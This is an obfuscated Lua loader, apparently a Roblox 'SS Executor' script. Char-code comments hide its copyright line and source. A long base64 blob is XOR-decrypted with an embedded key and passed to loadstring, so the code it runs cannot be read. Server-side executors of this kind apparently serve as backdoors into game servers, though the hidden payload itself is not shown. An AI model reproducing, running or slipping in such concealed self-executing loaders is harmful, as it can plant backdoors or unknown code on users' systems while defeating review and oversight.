-- string.char(40,99,41,32,83,83,32,69,120,101,99,117,116,111,114,32,32,124,32,32,85,110,97,117,116,104,111,114,105,122,101,100,32,99,111,112,121,105,110,103,32,111,114,32,114,101,100,105,115,116,114,105,98,117,116,105,111,110,32,105,115,32,112,114,111,104,105,98,105,116,101,100,46)
-- string.char(83,111,117,114,99,101,58,32,103,105,116,104,117,98,46,99,111,109,47,114,111,98,108,111,120,115,99,114,105,112,116,101,114,54,50,52,53,51,54,54,53,52,50,47,114,111,98,108,111,120,45,108,117,97,45,111,98,115,99,97,116,111,114)

local _c=string.char;local _fc=string.find;local _sb=string.sub
local _tc=table.concat;local _mf=math.floor;local _ld=loadstring or load

local _K1={142,149,240,143,162,153,36,51,246,221,152,23,138,97,76,59}
local _K2={94,37,64,159,114,41,116,67,198,109,232,39,90,241,156,75}
local _K3={46,181,144,175,66,185,196,83,150,253,56,55,42,129,236,91}
local _K4={254,69,224,191,18,73,20,99,102,141,136,71,250,17,60,107}

local _K={}
for _,v in ipairs(_K1)do _K[#_K+1]=v end
for _,v in ipairs(_K2)do _K[#_K+1]=v end
for _,v in ipairs(_K3)do _K[#_K+1]=v end
for _,v in ipairs(_K4)do _K[#_K+1]=v end

local _A=_c(65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47)

local function _bd(_i)
    local _r,_v,_b={},0,0
    _i=_i:gsub('[^'.._A..'=]','')
    for _n=1,#_i do
        local _ch=_sb(_i,_n,_n)
        if _ch=='=' then break end
        local _p=_fc(_A,_ch,1,true)
        if not _p then break end
        _v=_v*64+(_p-1);_b=_b+6
        if _b>=8 then
            _b=_b-8
            _r[#_r+1]=_c(_mf(_v/2^_b)%256)
            _v=_v%(2^_b)
        end
    end
    return _tc(_r)
end

local function _xd(_d,_k)
    local _r,_kl={},#_k
    for _i=1,#_d do
        local _a,_bv=_d:byte(_i),_k[((_i-1)%_kl)+1]
        local _rs,_bt=0,1
        while _a>0 or _bv>0 do
            if _a%2~=_bv%2 then _rs=_rs+_bt end
            _a=_mf(_a/2);_bv=_mf(_bv/2);_bt=_bt*2
        end
        _r[_i]=_c(_rs)
    end
    return _tc(_r)
end

local _P=''
_P=_P..'o7jQsp+kGQ7L4KUqt1xxBmMYfaJPFEl++1DVGmfMoXYTiK2Sf4T5bqvABQoXvNFmw3jdgi90KV5b'
_P=_P..'sLV6xywBVrOozYWPtAQTuJjAQtlBCWMbZhXLPXtUYyTtewd6vPMvW9nx3WL7qzzijkxFS/HmdtNl'
_P=_P..'wPpzKnxDC+LsMpZ0HAfh9JTqxrlSWpf98XnuCDpSOlAh81JZFyKqAcgMep3zKkrG5N0r16Nzvd1w'
_P=_P..'Q17xqz6Ka+qSP2kpXluwtXrHLAFWs6jNsp+kGQ7L4KUqt1xxBmMYfaJPFEl++1DVGmfMoXYTiK2S'
_P=_P..'f4T5bqvABQoXvNFmw3jdgi90HmkK4usmljFjBOW50NDH61YTy/3odOsNIBM4UC78BkAbLe5E4i02'
_P=_P..'nv8qQpXAwyPAoSHl3QUXTeCBPsQChctBLGYVD+7tb9hBUAr38IL8gLAuX5m++XuqMx8bfgVgv1IU'
_P=_P..'VCSnAI0dHZToGEvH5sYh3OxxxJhIW0PijS+bIbPLfTt1BAOvoU2Wfl8K4rWlxvG5BBPW/aU37QAh'
_P=_P..'XmRiJeshTAY1rw6ND3ik7y5c/P7fN82XNuSLUVRPo8VRkiqD3n5pQDBGrahn2jEBS+n0neqY3kFH'
_P=_P..'pbjqYeMCKRN8cTf6F0cnJrQbgUQ/07VBQtrzzi6ZlxS23RgXCqHRe5kkjdooDnEXNej6MZNyWUOs'
_P=_P..'xoTu0O1BQbGo8TWja0YWcwUX/htdVCWpH8hrNZL9J37Z8dYny+R74ZJKXFmhgzXeJIzTMixsBgX4'
_P=_P..'/CiIYhyJDgHQ4c25dkaYjv1l/AgvXncvLPARSBhjij3iQTWDvBQOiLCebpn1YabdXFggocx73gmw'
_P=_P..'ny9pRA8H9O01iT9wBO30nN/O+F1WhNe4N6pBJV1+aRC/BkERLeYPmkI7mrwuQNGaj2KZ5Cf3jlMZ'
_P=_P..'XeCFL9Z1zo47Q3ENAofhIdp/Ux+u2aCv1vFBXdaq+WXkSW5gEEA46gF0VA2pTaRIOZDwG0LU6cow'
_P=_P..'maU14phKFxuzn3XcbNufYCxgFhTjqCKUdTZh4vqT7s65dHSDtLgqqi0cAQlEKes0RgYArgSEQ3LT'
_P=_P..'zCdPzPXdBcytcbrdCQIDi4U93iuPyzIZUxYPrfwvn38cHO/nnqeAwmpWjqjrSqovIxsOSSHmF1sz'
_P=_P..'Nq9Dyg5h0e4uWsDiwWLcqjec91RYSeCAe5EphJ8vaUQkE+SyAZN/WC3n54P74fFNX5L1ukjVMh9k'
_P=_P..'G30F3C12VmrMBI4HNZ34a1rd9cFi1qg3rLldRF7zgyLWbMDafC0eaQri6yaWMVoe4PaE5s33BF2Z'
_P=_P..'qfFx80khSDkMSr9SCVQzpQyES3KX6SVNwfnALJHtc8W6AmRP9a80jCDInUEsegco4vwunHhfCvr8'
_P=_P..'n+GAtV9nn6n0crdDAl4mUDO9Xn0RO7JQhVQ93dg+XNTkxi3X+Wfr1BhSROXFUZsrhLUYJ3sXD+vx'
_P=_P..'b9hdUwrq/J7ogvRLV4Ox/WSkT2IZdy9Ksl8JJwuHQJhONJ/5Lw7H8dhi7JYfth+4owrgmjSXIZOf'
_P=_P..'cDt1DQXlpSmbfFlL/fmR/Mq5RV6UtP9i4xU1GzdLYNcGXQQEoxniCnfRyTtK1OTKYs2sOuXda39r'
_P=_P..'oY09iiCSn2I8ZwsP4+9nlHRLS+L8kqDW+EZA2bn5Y+tBKlIyQDOxeEUbIKcByHUbprx2Dpf42zbJ'
_P=_P..'t2m50kpWXa+LMootld1nOnERBeLmM59/SEXt+p2g0PZGX5ml63T4CDxPO1d2rUYcR3XwWNwVdYPz'
_P=_P..'KULa6IIuzKV++Z9LVEv1gynRdYbeIHgkAlS8sXDMJw9a66fCvZb7FlGT7ft2slJ/AmgSeK1BH0Ag'
_P=_P..'90LKLVCu22Vx5sOPf5m/WbbdGBd4wLtmrAS3kzIFRF4q3aRnqlZJArPFt/rLtS4T1v24R+YANV4s'
_P=_P..'Vn3PHkgNJrQexAcIoqEZfZmw+gvq+QbfrhQXftLRD61p6sIYQ3gMBezkZ6V9WEuztZzgw/1XR4S0'
_P=_P..'9nCqDj4bMkoh+3hFGyCnAchLNZD4LkqZsMkj0Kg28t0FFxqtzGv0T4zQcSh4QwD45iSOeFMFrvmf'
_P=_P..'7sbUS1ferflj4khGG34FYPMdShUv5gKDC3qC7igOiLDfIdioP76aWVpPr6QvijWn2mZlNAQH4O1r'
_P=_P..'2kN9PKC7gO7W8QgTgq/tcqNrbBt+BSn5UkcbN+YCgwcumfklJJWwj2KZ5HO2illFRKnOALAgmMph'
_P=_P..'FDQrMtnYZ5xwVQe0tdKhjOlFR57ztjWqg8qpfgdusQZGBze0BIZAcoLuKAecmo9imeRztt0YUUvo'
_P=_P..'gD6aZcuCMngvQxTo/DKIfzZLrrXQ6sz9LhPW/bh75QItV35DLrNSShFj+023Sz7Z7zlNnJqPYpnk'
_P=_P..'OvDdVlheoYo13jGI2nxDNENGrahn2jFLCvz72K3510FLg67FN8kOIUs3SSW/FEgdL/xNygl0gf0/'
_P=_P..'Rpu+jWJbQsG23xYZXu6fL4wsjtg6KnFKT4eoZ9oxHEuutZbuy/VBV9b2pTe7WmxJO1E17RwjVGPm'
_P=_P..'TY1JPvu8aw6V/MAh2Khz+ZYKGwrziXvDZZDccyV4SwDjoU3aMRxL5/PQ4c3tBFyd77hj4gQiMX4F'
_P=_P..'YL9SCVRjsQyaSXLTxwVLzeXcH5mWJviJUVpPoYo6lynanzBnOhMH+eBp1DMciQgH0K2Mt1Bchanq'
_P=_P..'fuQGZEk7DGmVUglUY+ZNyAc8kPUnS9GwhH+Z9Wi2j11DX/OCUd5lwJ93J3BpRq2oZ5Z+XQ/r8dCk'
_P=_P..'n7kVOZOz/B2ATGEbvLHAfeapVACpH40HNpj+OU/H+coxmSbHFh+st8gVbLlqxQIrkquA44QZCKVu'
_P=_P..'kd7/DndkD0ANpNFiXXqDCoPYu7yxwH3mqZbXRo98p7hlHKm6NXI7wltQ03RpuNW+AQ7Pfqd0P/Dd'
_P=_P..'lIHyDWrTevOo62wBcG02Gcandj8Ml2j1zNnKpaIL8svgwyT5aMXOcX7frlcEL6AtRLECfdqjqmN4'
_P=_P..'2xzRYF2Gyfb35m8cxxiFvIkaFRIbInuwsxRJGPUe4a6v3sfUH5C99KFS7eJLNZD4BkHRuI0u0KZ8'
_P=_P..'4pVdWk+vgC6fZ8m1fiZ1Byvi7G/YfVUJoeCZoc7sRRHf1/R46wUBVDoNYvMbS1shtASMQD/f8D5P'
_P=_P..'l7mlLtalN9uSXB8I7YU50TKJ0XYmY00K+Oll0xs2RqO1uemC7k1dkrLvN+wAJVc7QWy/HEYAK68D'
_P=_P..'jwctmPAnDsb4wDWZJtMC3VlVRfOYe4kslNcyKDQVD/7hJZZ0HAXh4Znpy/pFR5+y9h3jB2xVMVFg'
_P=_P..'wDUHKxCVQ4ZCLaX9KQ7B+Moss+Rztt1WWF7oiiLWZ6XtQAZGWUb64SmefktL6PSZ48f9BEeZ/fR4'
_P=_P..'6wViGx1NJfwZCRcsqB6HSz/fvmIklbCPYs6lIfjVGmxk5JQujRjAyHsncAwRo+QymzFYAuq1nuDW'
_P=_P..'uVZWkbTrY+8TbFU7UhT+EAmWw1JNiUU1g+giQNK+jWuz5HO23UpSXvSeNfQgjtsYQzlORm8cxxiF'
_P=_P..'vEva9JKvz/ZARpq46zdo9czZyqWiC/LL4MMk+WjFznF+365XBC+gLUSxAn3ao6pjeNsc0WBdhsn2'
_P=_P..'9+ZvHMcYhbyJGhUSGyJ7sLMUSRj1HuGur97H1B+QvfShUu0Ks9oTCMvMIRBN1jkmxxYfrLfIFWy5'
_P=_P..'asUCK5KrgOOEGQilbpHe/w53ZA9ADaTRYl16gwqD2Lu8scB95qmW10aPfKe4ZRypujVyO8JbUNN0'
_P=_P..'abjVvgEOz36ndD/w3ZSB8g1q03rzqOtsAXBtNhnGp3bX9HjrBQFUOg1i6xNLB2yjFY1EL4X5ZULA'
_P=_P..'8Y1rs6g895l1WE6pzi+fJ5OQYSxmFQP/piuPcB5ChPmf7sbUS1fe/+x26BJjSD9LJP0dUVovswzK'
_P=_P..'DlCd8ypK+P/LapuwMvSOF1pL7Zs6jCDO02coNkps4ecmnlxTD6a3hO7A6gtXk7L6cf8SLxUyUCG9'
_P=_P..'WyMYLKcJpUg+2b4/T9fjgCHRoTD9mEoZRvSNeddPjNBzLVkMAqWqM5tzT0T99oLm0u1XHZqo+TWj'
_P=_P..'ayBUP0EN8BYBVjenD5sIP5/qZULA8Y1rs85+u93ao6pjeNveA4nRcyV9EAOtatN686jrbAFwbTYZ'
_P=_P..'xqd2PwyXaPXM2cqlogvyy+DDJPloxc5xft+uVwQvoC1EsQJ92qOqY3jbHNFgXYbJ9vfmbxzHGIW8'
_P=_P..'iRoVEhsie7CzFEkY9R7hrq/ex9QfkL30oVLtCrPaEwjLzCEQTdY5JscWH6y3yBVsuWrFAiuSq4Dj'
_P=_P..'hBkIpW6R3v8Od2QPQA2k0WJdeoMKg9i7vLHAfeapltdGj3ynuGUcqbo1cjvCW1DTdGm41b4BDs9+'
_P=_P..'p3Q/8N2UgfINatN686jrhPyWr/3eCmyljrZk4g47az9CJb9SCVQ3rgiGBwW2shR95r7cKtazA/ea'
_P=_P..'XR8bqMx73iCO2xggckM5yqYYqUISAuD8hMzK/EdYk6+4Y+IEIhsBYm7AIXpaKqgEnGQylP8gS8e4'
_P=_P..'hmLcqjec91FRCueNMpIghJ8vdDRTRvngIpQbHEuutZ7g1vBCSt7/1HjrBSlffsfcDFIJXGHoQ4RI'
_P=_P..'O5X5LwCbso8v1qAm+phLHgio5j6SNoW1Mmk0Qwji/C6caBRJwvqR68f9BESfqfA3qE9iXT9MLPoW'
_P=_P..'B1ph5giaVTWDtDgHlXIv1pmnO/OeUxdJ7oIokSmFnTtDcQ0Ch4IilHUVYYT8lq/M9lATqbLzN/4J'
_P=_P..'KVVUBWC/Ul4VMahFynwUlOQ+Xeiw/Bb4lgfDrRhyeNOjCcRlwpE8PXsQEv/hKZ05Yw7859mmqLkE'
_P=_P..'E9at+3bmDWRdK0sj6xtGGmvvZ8gHetG8aw6V984v3P4U84lrUlj3hTibbcLsZihmFwP/zzKTMxVR'
_P=_P..'3fCEzM3rQRvUjv157i8jTzdDKfwTXR0sqE/ELXrRvGsOlbCPYpnkc+2pUUNG5NF5sCCYymFpUTE0'
_P=_P..'wtpl1kVZE/qohODR7VZamLqwSO8TPhJkVjX9WhhYe/ZExGMvg/0/R9r+knrE7Vm23RgXT++IcvQg'
_P=_P..'jtsY'

local _fn,_er=_ld(_xd(_bd(_P),_K))
if not _fn then
    warn(string.char(91,83,83,32,69,120,101,99,117,116,111,114,93,32,76,111,97,100,32,101,114,114,111,114,58,32)..tostring(_er))
else
    _fn()
end
